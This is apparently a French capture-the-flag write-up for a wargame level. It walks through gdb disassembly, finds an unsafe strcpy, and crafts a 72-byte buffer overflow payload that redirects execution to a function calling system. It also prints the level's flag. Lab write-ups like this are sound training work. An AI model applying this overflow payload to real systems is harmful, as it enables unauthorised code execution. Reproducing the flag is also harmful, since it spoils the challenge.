$gdb level6

(gdb) disas main 

0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>

On voit un call a strcpy, peut-etre vulnerable a un buffer overflow (cf : https://www.tallan.com/blog/2019/04/04/exploring-buffer-overflows-in-c-part-two-the-exploit/)

On va essayer de faire crasher le programme en faisant:

./level6 AAAAAAAAA.....

Le programme crash a partir de 72 A ! C'est bon signe.

(gdb) info functions : on voit deux fonctions n et m 

m est pas specialement interessante mais n :

(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:	push   %ebp
   0x08048455 <+1>:	mov    %esp,%ebp
   0x08048457 <+3>:	sub    $0x18,%esp
   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave  
   0x08048467 <+19>:	ret    
End of assembler dump.

On voit un appel a system ici. Il va falloir buffer overflow pour appeler cette fonction.

On va chercher l'adresse de n:

$objdump -t level6 | grep n 

08048454 g     F .text	00000014              n

Il faut juste construire la string maintenant

$./level6 $(python -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x54\x84\x04\x08"')

>> f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

$su level7 

good